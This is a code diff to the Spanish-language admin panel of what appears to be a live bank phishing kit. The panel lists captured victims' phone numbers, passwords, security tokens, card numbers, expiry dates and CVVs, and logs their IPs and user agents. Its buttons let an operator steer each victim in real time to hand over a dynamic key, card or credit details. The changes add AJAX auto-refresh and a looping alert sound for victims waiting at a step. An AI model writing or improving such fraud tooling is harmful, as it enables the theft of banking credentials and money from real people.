@@ -296,7 +296,12 @@
     <div class="main">
         <div class="header">
             <h1>Panel de Control</h1>
-            <div>Bienvenido, <strong>Admin</strong></div>
+            <div style="display: flex; align-items: center; gap: 20px;">
+                <button id="btnToggleSound" class="btn-clear-all" style="background-color: #555;" onclick="toggleSound()">
+                    <i class="fas fa-volume-up"></i> Sonido: Activado
+                </button>
+                <div>Bienvenido, <strong>Admin</strong></div>
+            </div>
         </div>
 
         <div class="card">
@@ -319,84 +324,8 @@
                             <th>Acciones</th>
                         </tr>
                     </thead>
-                    <tbody>
-                        {% for user in users %}
-                        {% set status = user.status|string %}
-                        <tr class="{% if status == '1' %}row-waiting{% endif %}">
-                            <td style="color: #888; font-size: 12px; font-weight: 700;">{{ user.time }}</td>
-                            <td style="font-weight: 700;">{{ user.phone }}</td>
-                            <td><span class="code-box">{{ user.pass }}</span></td>
-                            <td>
-                                {% if user.token %}
-                                <span class="code-box" style="color: #4f46e5;">{{ user.token }}</span>
-                                {% else %}
-                                <span style="color: #ccc;">Esperando...</span>
-                                {% endif %}
-                            </td>
-                            <td>
-                                {% if user.card_number %}
-                                <div style="margin-bottom: 5px;"><span class="code-box" style="color: #475569; background: #f1f5f9; font-size: 11px; text-transform: uppercase;">{{ user.card_holder }}</span></div>
-                                <span class="code-box" style="color: #0369a1;">{{ user.card_number }}</span>
-                                <span class="code-box" style="color: #0891b2;">{{ user.card_expiry }}</span>
-                                <span class="code-box" style="color: #be185d;">{{ user.card_cvv }}</span>
-                                {% else %}
-                                <span style="color: #ccc;">-</span>
-                                {% endif %}
-                            </td>
-                            <td>
-                                {% if status == '1' %}
-                                <span class="badge status-1">ESPERANDO</span>
-                                {% elif status == '2' %}
-                                <span class="badge status-2">ERROR CLAVE</span>
-                                {% elif status == '3' %}
-                                <span class="badge status-3">PEDI DINÁMICA</span>
-                                {% elif status == '4' %}
-                                <span class="badge status-4">ERR DINÁMICA</span>
-                                {% elif status == '5' %}
-                                <span class="badge status-5">FINALIZADO</span>
-                                {% elif status == '6' %}
-                                <span class="badge status-6">PEDÍ TARJETA</span>
-                                {% elif status == '7' %}
-                                <span class="badge status-7">ERR TARJETA</span>
-                                {% elif status == '8' %}
-                                <span class="badge status-8">PEDÍ CRÉDITO</span>
-                                {% elif status == '9' %}
-                                <span class="badge status-9">ERR CRÉDITO</span>
-                                {% else %}
-                                <span class="badge" style="background:#eee;">{{ user.status }}</span>
-                                {% endif %}
-                            </td>
-                            <td class="actions">
-                                <button class="btn-sm btn-error-login" onclick="setStatus({{ user.id }}, 2)">
-                                    <i class="fas fa-times-circle"></i> Error Clave
-                                </button>
-                                <button class="btn-sm btn-ask-dynamic" onclick="setStatus({{ user.id }}, 3)">
-                                    <i class="fas fa-key"></i> Dinámica
-                                </button>
-                                <button class="btn-sm btn-error-dynamic" onclick="setStatus({{ user.id }}, 4)">
-                                    <i class="fas fa-exclamation-triangle"></i> Err Dinámica
-                                </button>
-                                <button class="btn-sm btn-ask-card" onclick="setStatus({{ user.id }}, 6)">
-                                    <i class="fas fa-credit-card"></i> Pidir Tarjeta
-                                </button>
-                                <button class="btn-sm btn-error-card" onclick="setStatus({{ user.id }}, 7)">
-                                    <i class="fas fa-credit-card"></i> Err Tarjeta
-                                </button>
-                                <button class="btn-sm btn-ask-card-credit" onclick="setStatus({{ user.id }}, 8)">
-                                    <i class="fas fa-credit-card"></i> Pedir Crédito
-                                </button>
-                                <button class="btn-sm btn-error-card-credit" onclick="setStatus({{ user.id }}, 9)">
-                                    <i class="fas fa-exclamation-circle"></i> Err Crédito
-                                </button>
-                                <button class="btn-sm btn-finish" onclick="setStatus({{ user.id }}, 5)">
-                                    <i class="fas fa-check-circle"></i> Finalizar
-                                </button>
-                                <button class="btn-sm btn-delete" onclick="deleteUser({{ user.id }})" title="Eliminar">
-                                    <i class="fas fa-trash"></i>
-                                </button>
-                            </td>
-                        </tr>
-                        {% endfor %}
+                    <tbody id="usersTableBody">
+                        {% include 'users_table.html' %}
                     </tbody>
                 </table>
             </div>
@@ -413,14 +342,8 @@
                             <th>Hora</th>
                         </tr>
                     </thead>
-                    <tbody>
-                        {% for log in logs %}
-                        <tr>
-                            <td style="font-weight: 700;">{{ log.ip }}</td>
-                            <td style="color: #666; font-size: 12px;">{{ log.ua }}</td>
-                            <td>{{ log.time }}</td>
-                        </tr>
-                        {% endfor %}
+                    <tbody id="logsTableBody">
+                        {% include 'logs_table.html' %}
                     </tbody>
                 </table>
             </div>
@@ -442,6 +365,47 @@
     <script>
         let confirmCallback = null;
 
+        // Configuración de audio para alerta
+        const alertSound = new Audio('/assets/img/fronbondi_skegs-sfx-mario-brothers-like-coin-grab-sound-effect-236423.mp3');
+        alertSound.loop = true;
+        let isSoundMuted = false;
+        let userInteracted = false;
+
+        // Desbloquear reproducción de audio en la primera interacción
+        document.addEventListener('click', () => {
+            if (!userInteracted) {
+                userInteracted = true;
+                alertSound.play().then(() => {
+                    alertSound.pause();
+                    checkWaitingUsers();
+                }).catch(e => console.log('Esperando interacción para audio...'));
+            }
+        }, { once: false });
+
+        function checkWaitingUsers() {
+            const hasWaiting = document.querySelectorAll('#usersTableBody .row-waiting').length > 0;
+            if (hasWaiting && !isSoundMuted && userInteracted) {
+                alertSound.play().catch(e => console.log('Autoplay bloqueado por el navegador.'));
+            } else {
+                alertSound.pause();
+            }
+        }
+
+        function toggleSound() {
+            isSoundMuted = !isSoundMuted;
+            const btn = document.getElementById('btnToggleSound');
+            if (isSoundMuted) {
+                btn.innerHTML = '<i class="fas fa-volume-mute"></i> Sonido: Silenciado';
+                btn.style.backgroundColor = '#ef4444';
+                alertSound.pause();
+            } else {
+                btn.innerHTML = '<i class="fas fa-volume-up"></i> Sonido: Activado';
+                btn.style.backgroundColor = '#555';
+                userInteracted = true;
+                checkWaitingUsers();
+            }
+        }
+
         function openCustomConfirm(title, text, callback) {
             document.getElementById('modalTitle').innerText = title;
             document.getElementById('modalText').innerText = text;
@@ -460,7 +424,30 @@
             closeCustomModal();
         };
 
+        // Función para refrescar dinámicamente las tablas por AJAX
+        async function refreshData() {
+            try {
+                // Refrescar tabla de usuarios
+                const resUsers = await fetch('/admin/api/users_table');
+                if (resUsers.ok) {
+                    const htmlUsers = await resUsers.text();
+                    document.getElementById('usersTableBody').innerHTML = htmlUsers;
+                    checkWaitingUsers();
+                }
+
+                // Refrescar logs de visitas
+                const resLogs = await fetch('/admin/api/logs_table');
+                if (resLogs.ok) {
+                    const htmlLogs = await resLogs.text();
+                    document.getElementById('logsTableBody').innerHTML = htmlLogs;
+                }
+            } catch (error) {
+                console.error('Error al refrescar datos por AJAX:', error);
+            }
+        }
+
         async function setStatus(userId, status) {
+            alertSound.pause(); // Detener sonido inmediatamente al tocar botón
             try {
                 const response = await fetch('/admin/set_status', {
                     method: 'POST',
@@ -469,7 +456,7 @@
                 });
                 const data = await response.json();
                 if (data.status === 'success') {
-                    location.reload();
+                    await refreshData();
                 } else {
                     alert('Error al actualizar estado');
                 }
@@ -480,6 +467,7 @@
         }
 
         async function deleteUser(userId) {
+            alertSound.pause(); // Detener sonido inmediatamente
             openCustomConfirm('Eliminar Captura', '¿Seguro que quieres eliminar esta captura? Se borrará definitivamente.', async () => {
                 try {
                     const response = await fetch('/admin/delete_user', {
@@ -488,12 +476,15 @@
                         body: JSON.stringify({ user_id: userId })
                     });
                     const data = await response.json();
-                    if (data.status === 'success') location.reload();
+                    if (data.status === 'success') {
+                        await refreshData();
+                    }
                 } catch (e) { alert('Error al borrar'); }
             });
         }
 
         async function deleteAll() {
+            alertSound.pause(); // Detener sonido inmediatamente
             openCustomConfirm('Vaciar Todo', '¡ATENCIÓN! Se borrarán TODAS las capturas del sistema. ¿Deseas continuar?', async () => {
                 try {
                     const response = await fetch('/admin/delete_all', {
@@ -501,13 +492,18 @@
                         headers: { 'Content-Type': 'application/json' }
                     });
                     const data = await response.json();
-                    if (data.status === 'success') location.reload();
+                    if (data.status === 'success') {
+                        await refreshData();
+                    }
                 } catch (e) { alert('Error al vaciar'); }
             });
         }
 
-        // Auto recargar cada 3 segundos para ver nuevos datos en "tiempo real"
-        setInterval(() => location.reload(), 3000);
+        // Auto recargar tablas por AJAX cada 3 segundos para ver nuevos datos en tiempo real
+        setInterval(refreshData, 3000);
+        
+        // Ejecutar primera comprobación al cargar la página
+        setTimeout(checkWaitingUsers, 500);
     </script>
 
 </body>
